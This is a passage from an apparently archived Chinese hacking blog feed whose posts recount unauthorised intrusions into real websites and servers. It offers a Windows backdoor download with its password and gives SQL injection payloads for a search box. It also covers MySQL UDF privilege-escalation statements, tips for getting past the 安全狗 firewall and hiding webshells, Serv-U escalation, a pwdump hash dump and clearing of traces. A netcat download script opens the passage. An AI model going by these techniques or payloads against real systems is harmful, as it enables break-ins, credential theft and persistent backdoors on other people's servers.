<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -eq 4 ]]; then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">wget $ssh4 -O $dir/netcat.tar.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd $dir</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">tar zxvf netcat.tar.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd netcat*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">./configure</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">make &amp;&amp; make install</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Netcat install ok”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">rm -rf /tmp/netcat*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span></p>

<p>++++++++++++++++++++++++++++++++++++++++++++++++++</p>

<p>感谢以上文章作者。</p>

<p>最后说一句，最后知道是内网是盆友惊醒俺ifconfig了一下。顿时觉得手贱了。。</p>

<p> </p>

<p> </p>

<p> </p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[超xx的逆向分析视频]]></title>
      <url>/system/2013/06/07/e8-b6-85xx-e7-9a-84-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-e8-a7-86-e9-a2-91/</url>
      <content type="html"><![CDATA[<p>好吧，俺标题党了。 就是一个crackme.exe文件，小菜自个儿写的，科普型的。 外带一个对应的逆向分析视频。</p>

<p>大神们看见求勿踩.</p>

<p><span style="color: red;">话说附上的链接里不是文字附件。</span> <span style="color: red;">是视频+exe文件。。</span></p>

<p>附上下载。</p>

<p><a href="http://pan.baidu.com/share/link?shareid=547240&amp;uk=4113276289" target="_blank">http://pan.baidu.com/share/link?shareid=547240&amp;uk=4113276289</a></p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[简易win通用型后门]]></title>
      <url>/tools/2013/05/11/e7-ae-80-e6-98-93win-e9-80-9a-e7-94-a8-e5-9e-8b-e5-90-8e-e9-97-a8/</url>
      <content type="html"><![CDATA[<p>简易替换型后门，通杀win系列主机。很牛逼吧。哈哈</p>

<p>下下来别骂我坑。。。。</p>

<p>开玩笑的。。还是比较有用的</p>

<p><a href="http://pan.baidu.com/share/link?shareid=514372&amp;uk=2067242311">http://pan.baidu.com/share/link?shareid=514372&amp;uk=2067242311</a></p>

<p>自己下吧。亲们~后门密码：@demon@</p>

<p> </p>
]]></content>
      <categories>
        
          <category> tools </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[公私密钥认证登陆实验引发的思考]]></title>
      <url>/system/2013/05/08/e5-85-ac-e7-a7-81-e5-af-86-e9-92-a5-e8-ae-a4-e8-af-81-e7-99-bb-e9-99-86-e5-ae-9e-e9-aa-8c-e5-bc-95-e5-8f-91-e7-9a-84-e6-80-9d-e8-80-83/</url>
      <content type="html"><![CDATA[<p>今天做公私密钥实验，想做个ssh后门。结果在centos上用ssh-keygen生成公私密钥后，</p>

<p>正打算把公钥传到另一台准备好的bt5上， 放入 /home/$user/.ssh目录中，并追密钥id</p>

<p>到bt5上的公钥准备登陆，可是遇到两个问题。</p>

<p>第一，bt5积极拒绝连接，换成非同root用户后，centos还是连不上ssh。</p>

<p>第二， 新添加用户后，发现bt5下的home并未生成用户专属目录更不用提.ssh目录，自然实验失败。</p>

<p>不知是否重启后会生成新的用户目录。</p>

<p>思考：是否必须root才能远程登陆？然而bt5是否设置了拒绝22端口，需要修改？</p>

<p>加新用户后容易被管理发现，可不可以设置 隐藏$user文件夹，或者root有没有类似目录内直接可以使用.ssh呢？</p>

<p>我觉得应该是可以的~</p>

<p> </p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[管家婆软件管理系统拿shell]]></title>
      <url>/pentest/2013/03/18/guanjiapogetshell/</url>
      <content type="html"><![CDATA[<p>春日多娇，春意盎然，鄙人一位好友晚上因此寂寞难耐，于是乎先前扔我一站让我跟他一起日。打开一看，管家婆，任我行软件。貌似在哪里听过。    （PS：似如此风骚的名字其实都耳熟）。问问朋友，结果是他在某群里看到的，一个中型企业管理系统。恩。就当练练手吧。先百度了下C段，               找了个域名日进去，正猜着目录（全静态很蛋疼），好友相当速度地发来一个图。</p>

<p>说多了都是泪啊。。这老小子太快了。</p>

<p>进去以后为了分头行事方便，当然先加个多余的管理再说。。鬼知道他有没有对单账户多session做限制。在里面找到一个管理添加，点开：</p>

<p>好嘛。虽然进入后台没限制，具体操作还是要求cookie的。我们不怕，这种果断禁用JS开搞。本来用IE试试，管理员域名默认不允许填写的。             </p>

<p>NND， 这还了得。操戈启航，用google试试。禁用JS。</p>

<p>审查元素修改READONLY的项目。</p>

<p>顺利加上管理，调成超管。</p>

<p>里面晃了半天，发现图片上传过滤的还好，而且不能获取到上传地址。且看看编辑器，机油说是cuteEditor的。。以前搞过，0day貌似不多。正纠结。。</p>

<p>偶然发现里面有个右侧管理栏目，点进去一看，有个不同的上传点，不仔细看还真没看到。⊙﹏⊙b汗</p>

<p> </p>

<p>果断试试。。死鱼眼一翻。发现了新增了一个管理项。右键属性，你们懂得。</p>

<p>进菜刀看了下，内网思密达，顿时兴趣索然了。。和好友商量了下。国内企业站服务器就不多搞了，进去喝茶就不好了。</p>

<p>就这样吧。。</p>

<p> </p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[“撸”久不瑟，感觉不会再爱了]]></title>
      <url>/pentest/2013/03/12/pentest_fuck/</url>
      <content type="html"><![CDATA[<p>闲话少说，昨儿有机油丢给我一个shell。国外的服务器，那人本来是想架一个VPN自用，准备找个雏儿开搞。。</p>

<p>话说那服务器确实挺快的。。      查了下，一大把站。
心中暗喜。看起来主机不是比较恶心的虚拟主机管理系统。估计有门儿。       先查查cmd。</p>

<p>拒绝访问。           好吧。果然又是个管理怪蜀黍。果断问问机油。给力，他非常速度找到了一个可写。</p>

<p>由于exp存货有限。没看补丁数。直接传了cmd和一堆exp.            无果。果然够变态。。       粗略翻了一下。</p>

<p>上面的站都是php和asp的。虽然C盘找到sqlsever。。。       自扫描端口。</p>

<p>显然不太理想，幸好3389是开的。       于是乎。       我在那堆站里翻啊翻。没一个sa 。我擦。1433他开着玩我呢。</p>

<p>最后翻到了个Mysql配置文件</p>

<p>看了看到里面有个配置的mysql的账户      果断记下来。。话说幸好不是站库分离的，不然俺就秀逗了。</p>

<p>上了个php马。  果断登陆之。很明显不是root。。</p>

<p>但是人品好。在mysql的user里翻到了这个</p>

<p> </p>

<p>有图有真相      喜滋滋地拿去破咯，cmd5收费的mysql5数据。       话说现今好心人蛮多的。帮我秒破。</p>

<p>拿去登陆。      接下来来的思路是神马呢。       在我的印象里，mssql的sa是可以直接执行cmd命令的</p>

<p>而mysql的root，必须要通过创建函数，比如通过执行cmdshell里的命令提权。       LPK和UDF，我选择了UDF。</p>

<p>好嘛。MYSQL5.xx。于是就创建lib\plugin呗。      小插曲：我本来想直接上个udf.php。不过突然一激灵。变态</p>

<p>管理蜀黍没准儿把默认路径改了的。果断show一下环境变量。      发现改在了D盘。        果断进驻，想要手动建</p>

<p>目录。很悲剧的是。</p>

<p>好吧。我们至少还有root。     前面我们提到，mysql的root可以通过创建函数执行系统命令。     我们可不可以利用</p>

<p>这个呢     查了下资料。估计是光棍当得太久了当衰了。没查到。。     果断问问几个好基友和攻城狮牛。。     好吧。</p>

<p>Haxxxxxxxx。。。是个大好银[（据说是高富帅喔）。学学Strong哥的写法。]        他给了我指了条路。原先他在</p>

<p>上年度发了一个python利用工具。也就是第六弹。     里面可以自动创建lib/plugin目录。     俺欣喜若狂啊。这时</p>

<p>已经大半夜了。     果断准备安下win下的python环境。     这时人品问题来了。。。nnd，网断了。。。</p>

<p>这就好比你都脱了那啥，那表演的人就给你看那啥。     你懂得。     无奈。。。洗洗睡了。     次日，也就是今天。起床了</p>

<p>继续搞。     安装了下win的python环境。。。话说本来想在linux下搞得。一直是总是缺这个缺那个的。     本屌怒了</p>

<p>。。以后不在上面试了。。貌似linux下有的模块win下都有。还更齐全。     安装完毕，启动exp。准备发射。</p>

<p>好吧。。啥JB人品。。。试了几次不是不能连就是拒绝。     话说开了外连的，难道是IP被拒绝了？     尝试了下</p>

<p>允许所有IP外链</p>

<p><strong>mysql&gt; grant all privileges on <em>.</em> to ‘yourname’@’%’ identified by ‘youpasswd’;</strong>
<strong>mysql&gt; flush privileges;</strong>
NO RESULT。还是老样子。不能连。
看来介个exp用不成了。   但是我们要知道。EXP最终利用的还是语句。拿到语句我们可以本地手工开啊</p>

<p>我看了下源代码。找到了（当然haxxxxxx机油后来也发给我那语句了。）
<strong>select ‘xxx’ into outfile '%s/lib::$INDEX_ALLOCATION'</strong>
这句和haxxxxxx写的不是完全一样。因为他当时正忙着其他事，敲得代码不一定对。所以 当时以我后来</p>

<p>在搜集的资料总结为准。     本语句的是利用报错式的插入。将某不存在的东西插入插件目录lib，因为lib目录</p>

<p>是不存在 的。所以它会因为报错给但是给建立一个相应的目录。Plugin的目录建立同上。   于是乎。我按这个</p>

<p>思路走。</p>

<p>恩恩。看样子有前人来过了。Mysql5.xx默认是没有这个目录的       不过后面就有些悲剧了。   最后导出udf.Dll时显示</p>

<p>Can not open or write 那啥udf.dll。。   小弟尝试用load_file将其导出也出错。。。不知道是哪里被限制了    好嘛，</p>

<p>我们先来看看能不能直接执行命令。   利用Function创建CMDSHELL，报错。仍继续、</p>

<p>Game Over。。 CMDSHELL不存在。    介个情况有两种说法    一种是组件被禁用。还有一种是。。你懂得。UDF没成功。</p>

<p>实在没法了。后来试图反弹一个shell回本机，用nc监听端口。    好吧。。连服务器公网转发都省了。又直接报错。
到了这里也到了尾声了。基本上能试的都试过了。高版本Mysql的提权法就那几种。   在我搞得那个被另外一大神确诊</p>

<p>为root亦不可写的目录里，实在是没搞下来。   有机油给我提过LPK以及MOF。大同小异。目录被封杀了，至少在我这里无解。
最后想了想，估计也让只有牛牛们的exp可能将其拿下吧</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[对 WAF系统“网站安全狗”的浅探]]></title>
      <url>/pentest/2013/03/12/safedogbypass/</url>
      <content type="html"><![CDATA[<p>大家看了就图一乐呵，小弟没能写出特别高深的东西，权当抛砖引玉吧。
这两天在探究NIDS和WAF的机制，打算交论文啊。鄙人很是头疼，因为编程水平有限，接触不到太深层的东西。 比如基于服务器扩展的API—-ISPAI, 作为一个提供的DLL，驻留在WWW服务器中的程序代码，其扩展WWW服务 器的功能与CGI相同，而大大提高了运行效率和安全性，我们耳熟能详的那些WAF系统应该就是采用了它作为对Web 的接口进行有效防御。
但是作为Web安全爱好者，所关心的并不是底层的编程漏洞，我们需要关注的是对于规则库的研究和他的防御机制。 所以，有了以下的这篇文章。
为了测试，我先尝试搭建了“IIS版网站安全狗”。虽然有些大神说安全狗并不太好。但毕竟它与护卫神和一流防护 等软件也让不少人头痛过，我们仍可以将它作为探究的一个引子。另外，对于防注入和其他功能，Apache版本的和IIS版本 的其实只是在条款上的区别，请不要纠结。
无图无真相：</p>

<p>或许，不知道我说错木有，部分爱好Web安全的机油对于安全狗又爱又恨，爱的是寻求突破的过程，恨的是为了对付它 蛋蛋隐隐作痛。为了绕过它，有些机油们做的猜测盲目有些盲目，类似于管中窥豹得不到全貌。所以有些尝试并不太有效。     我们这里对他的部分功能进行简单分析：</p>

<p><strong>主动防御：</strong></p>

<p>大家可以看到，在网站安全狗里，主动防御提供sql注入防御模块儿的最新官方规则库主要有三大类：XSS注入，菜刀执行 和sql注入。可限制url长度上限。每个规则可自定义url注入、cookie注入以及post注入的检测选项。在这里提一下。url检测就是 做出对get注入传参和xss的防御。举个例子，也就是说，我们如果取得了某项特殊的注入，通过对比官方对于三项的限制。理论 上是可以在绕不过url的时进行post注入的。
而且，由于工具虽然有专门对于菜刀的拦截，但是并非全版本有效，同时，我们也有可能尝试其他特殊的一句话客户端。</p>

<p><strong>对于主动防御的网马防护模块：</strong></p>

<p>我们可以看到，在其中对于文件名做了单独防御。部分同志通过burp绕过了上传。有的童鞋通过文件包含突破，或是利用解析漏洞 创建畸形文件夹和文件。在这里其实有一个小点，因为安全狗默认禁止了浏览畸形文件，一般童鞋尝试普通的畸形文件解析是不行的。 但它并特别限制畸形目录，所以可以在目录名前后做文章，注释或者那啥，大神们有空去研究喔。</p>

<p><strong>对于文件后缀的防御：</strong></p>

<p>撸主看了下，上传防御那啥居然没有限制和.com、.cmd、.bat，部分危险脚本后缀也未做限制，这让小弟着实抹了一把汗。至于其他的 后缀只要没特定限制的话，是可以通过上传后改名的。</p>

<p>值得一提的是，安全狗有主动网马查杀功能，机油们在得到Webshell以后，并不要轻易放松。小弟指的是Webshell不免杀的情况。 某个倒霉孩子千辛万苦通过神马copy以及文件包含等诸多手段得到Webshell以后。前脚刚擦完屁股，乐颠乐颠地去吃饭，后脚管理就给删了， 这种情况并不算少见。所以，做好免杀，或者在正常页面插入免杀一句话（阴暗角落你懂得）是小弟比较推荐的。插数据库滴事儿还是建议 能免则免。
曾见过不少机油手握安全狗专杀工具，眼红ing。。。毕竟，拿到webshell后能K掉狗后续工作能方便许多。
至于其他监控模块，有点忍不住要吐槽一下流量防。毕竟是网站保护软件，做硬防和流量防护自然由NIDS和机房防火墙管理。如果个人测试 也不用管流量神马的了。这功能用在这里的话实在有些鸡肋。还有CC防模块，有时正常访问某网站它也会抽风，耍赖瘫痪，确实做的不算特别专业。
最后，安全狗有个防爬虫功能和前面说到的CC防是需要注意的。我们扫描时发送请求时线程最好调低一些，一味追求快恐怕最后只得蛋疼地换IP了。
另外，本来想反编译安全狗的数据文件，分析下它的规则库，奈何水平有限，期待大神做有效尝试。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[一次拿shell引发的提权]]></title>
      <url>/pentest/2013/03/12/getshellpentest/</url>
      <content type="html"><![CDATA[<p>昨儿有个盆友发来一个站的shell，说让我拿下同服的另一个shell，当时正好有事儿，所以昨晚人家都睡了才开始看看~</p>

<p>那个站和目标站是同一套cms的，我喜滋滋的先去问问盆友到底咋进的后台，人家一句话把我噎着了，默认帐密。。好吧，估计进了后台拿shell不难。</p>

<p>于是乎。</p>

<p>NND，其实也想到了，默认帐密和post注入都不行。不然人家扔给本菜干嘛。。</p>

<p>好吧</p>

<p>前台去看看~</p>

<p>加了一个‘或者and 3=4 、and 3=3</p>

<p>连个回显都木有</p>

<p>看来get注入是行不通了。</p>

<p>XSS最近很流行的说本来想试试</p>

<p>可人家催的急，这玩意儿弄cookie等太久了就算了</p>

<p>用盆友的大马上了个一句话看看</p>

<p>E盘跨不鸟</p>

<p>权限不够</p>

<p>不过可以看看其他盘</p>

<p>你说我该哭还是该笑？</p>

<p>有360，但是也有serv-u</p>

<p>好吧</p>

<p>试试serv-u默认帐密提权</p>

<p>盆友的坑爹老马不给力只能测出不支持php,aspx，jsp..汗一个。。</p>

<p>自己传了个能让serv-u利用的脚本</p>

<p>执行命令</p>

<p>成功！</p>

<p>用户加进了管理组。。</p>

<p>这里插一句</p>

<p>登陆时有个小插曲</p>

<p>本地连接2那个才能用，盆友还对我说估计是可能另一个是内网用的？</p>

<p>好吧。。大概吧</p>

<p>喜滋滋的去登陆</p>

<p>好吧。。它限制登陆。。说只有远程用户组才能登陆。。</p>

<p>坑爹。。</p>

<p>难道管理组不是默认远程用户组？</p>

<p>好吧</p>

<p>我又把他加入了TelnetClient组。。</p>

<p>无果。。</p>

<p>郁闷啊。。</p>

<p>难道是系统策略限制？</p>

<p>看看补丁吧</p>

<p>试着扔几把神器上去。。</p>

<p>330多个</p>

<p>估计没准儿有戏</p>

<p>看了下</p>

<p>也没去扫可写</p>

<p>直接进的C:/RECYCLE</p>

<p> </p>

<p>好吧。当时我心凉了一半</p>

<p> </p>

<p>那儿已经有前辈的神器躺着了</p>

<p> </p>

<p>还是试了下。。</p>

<p> </p>

<p>另外几个也一样。</p>

<p>没被杀结果被拦了</p>

<p>好吧</p>

<p>Nnd肿么办。。</p>

<p>陷入了沉思。。</p>

<p>我们要的是权限，拿到权限我们就可一OOXX。</p>

<p>改了管理密码神马的</p>

<p>小弟心肠不差。只想挖出他的管理密码hash就成。。</p>

<p>问了一个机油。。</p>

<p>他让我lpk劫持</p>

<p>注册表读sys键值神马的</p>

<p>可惜据他说lpk被人捷足先登、注册表读sys貌似被人限制了</p>

<p>读普通的远程3389端口键值神马的还行。。</p>

<p>一时间陷入无限郁闷，难道就这么算了？</p>

<p>突然。。灵光一闪。。</p>

<p>一拍大腿。。尼玛。先前的serv-u不就是sys权限。。</p>

<p>又脑残了。。</p>

<p>果断上了个pwdump</p>

<p>好</p>

<p>开始抓hash。。</p>

<p>不负众望啊。。</p>

<p> </p>

<p>———————————————BEGIN DUMP ——————————————–</p>

<p> </p>

<p>admin:1008:F0D412BD764FFE81AAD3H3IS451404EE:209C6174DA490CAEB422F3FA5A7AE634:::</p>

<p> </p>

<p>IWAM_KQYB-8JHKJ33W7W:1004:3C1E371BE839ECF544448CAB912DE14B:D245FA59D90CDD1A2F33DC97CE662301:::</p>

<p> </p>

<p>IUSR_KQYB-8JHKJ33W7W:1003:3E164BAEBC96C258A4C39808F5B3C18F:257B69A2D7FFDDCB14BADB94B67CFA2B:::</p>

<p> </p>

<p>SUPPORT_388945a0:1001:AAD3B423GH3404EEAAD3B435B51404EE:2147A411C657AB3C97586A4EC0B43B64:::</p>

<p> </p>

<p>Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</p>

<p> </p>

<p>Administrator:500:6294749A6F5CF3021AA818381F293IE:DABBB86911FE613D9509F6F3D7C4C487:::</p>

<p> </p>

<p>———————————————-END DUMP —————————-</p>

<p> </p>

<p>咳咳。。在这里批注下</p>

<p>那个贴出来的hash值因为为了避免某些不必要的麻烦</p>

<p>已经被我改了一部分</p>

<p>大家不用去试了。。。</p>

<p>拿到hash解密出来了。。激动ing。。。</p>

<p>        Mstsc你们懂得。。</p>

<p> </p>

<p>好吧</p>

<p>这管理怪蜀黍还在这儿登qq。。。</p>

<p>现在就是帮人拿目标站的shell了</p>

<p>先前没echo进去，在此说明下。。</p>

<p>结果。。</p>

<p>在c、d、e、f盘里查询目标站站名关键字。。坑爹</p>

<p>居然没有。。</p>

<p>试着去手动找一下。</p>

<p>好吧</p>

<p>我眼神不好没看到。</p>

<p>肿么办</p>

<p>其实鄙人又脑残了把</p>

<p>大家应该都看到桌面的iis管理器了</p>

<p>打开了你们都懂的</p>

<p>看图</p>

<p>果断读出物理路径。。</p>

<p>在目标站上了个一句话。。</p>

<p>然后清理屁股，删recycle里的东东</p>

<p>各种淫荡你们懂得。</p>

<p>向盆友交差咯。。</p>

<p>手上没有好点的后门，就没上了。</p>

<p>不会免杀好桑心。。</p>

<p>看那位大大施舍个免杀的好用点的后门给我。。</p>

<p>就这样吧。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[一次菜级渗透]]></title>
      <url>/pentest/2013/03/12/initpentest/</url>
      <content type="html"><![CDATA[<p>RT，小菜前天碰到一个百度收录较为前面的asp站,突然萌发了想练练手的想法，于是乎有了下面的文章。</p>

<p>稍微手工了下，url栏输入’以及3=3和3=4返回正常。</p>

<p>但是浏览器显示脚本错误。蛋疼，大概没有注入吧。</p>

<p> </p>

<p>啊D和haviji齐上。</p>

<p>悲剧的是没反应，数据库无法猜解。而且注入点也没出来。</p>

<p>小菜没法，掏出神器御剑以及大字典狂扫不已。</p>

<p>扫下。。木有编辑器，估计都被删了或者改名了。</p>

<p>不一会儿。后台出来了。</p>

<p>猜解弱口令。。这管理员还是蛮变态的，连个漏子都没得。用户名和密码都没得捡。怎么办呢。</p>

<p>回到前台。突然发现搜索栏还没有检测，啊。。。没准儿有门儿。</p>

<p>在搜索栏加了个  ’</p>

<p>报错。。唉。貌似有门儿。</p>

<p>继续法克之~</p>

<p>搜索框里：</p>

<p>输入</p>

<p>1%’and(select count(*)from admin_user)&gt;0 and ‘%’=’</p>

<p>猜出表名。</p>

<p>admin_user</p>

<p>1%’and(select top 1 len(username)from admin_user) and ‘%’=’</p>

<p>猜出用户名字段</p>

<p>username</p>

<p>1%’and(select top 1 len(pwd)from admin_user) and ‘%’=’</p>

<p>猜出密码字段</p>

<p>pwd</p>

<p>余下的就不一一列举了。</p>

<p>手注猜用户。。很蛋疼的说。</p>

<p>于是乎掏出另一个神器WVS</p>

<p>扫啊扫啊、、</p>

<p>老外的东西是好用。就是操作有点蛋疼，崩溃了数次。</p>

<p>Table –&gt;Colunum-&gt;Data</p>

<p>都是半自动自动注入的。不过猜解时显得有点慢。</p>

<p>上图</p>

<p>（图已挂掉）</p>

<p>大约4分钟后</p>

<p>跑出了数个字段</p>

<p>其中就包括手注的pwd和username</p>

<p>PS:</p>

<p>其实，后来发现在url栏换种方法就可以注入的。“Exists”并没有过滤。</p>

<p>直接显示值, 可以通过报错 和 返回不存在 来判断是否有那个字段。</p>

<p>经验不足、</p>

<p>⊙﹏⊙b汗</p>

<p>但猜出的表是木有admin_user</p>

<p>但有users  有点怪</p>

<p>拿到帐密顺利进入后台。</p>

<p>蛋疼的是。。他后台木有样式添加。木有单页添加</p>

<p>只好找上传。不出所料。。图片上传和文件上传都是白名单过滤。</p>

<p>肿么办。。iis6.0服务器，但截断用不了。过滤老。</p>

<p>好吧。。</p>

<p>Winsock抓包上传。。有上传漏洞，用nc提交。。</p>

<p> </p>

<p>回显结果。。</p>

<pre class="brush:python;">
HTTP/1.1 405 Not Allowed 
Server: nginx/0.8.53 
Date: Wed, 25 Jul 2012 18:33:00 GMT 
Content-Type: text ml Content-Length: 575 
Connection: close


&lt; html&gt; 
&lt; head&gt;
&lt;title&gt;405 Not Allowed&lt;/title&gt;
&lt;/head&gt; 
&lt; body bgcolor="white"&gt; 
&lt; center&gt;
&lt;h1&gt;405 Not Allowed&lt;/h1&gt;
&lt;/center&gt;
&lt; hr&gt;
&lt;center&gt;nginx/0.8.53&lt;/center&gt; 
&lt; /body&gt; 
&lt; ml&gt; &lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; &lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; &lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; 
&lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; 
&lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; &lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt;
</pre>

<p>====================================================================</p>

<p> </p>

<p> </p>

<p>无奈，不知道是他抽风还是我抽风。</p>

<p> </p>

<p>换吧。把抓包的信息填进明小子。。</p>

<p> </p>

<p>再试一次。。</p>

<p> </p>

<p>OK..这次人品还不太差。</p>

<p> </p>

<p>顺利拿到shell….上大马；</p>

<p>至于服务器就没去提了。。实在太卡了。。跳转目录也会抽风。</p>

<p> </p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
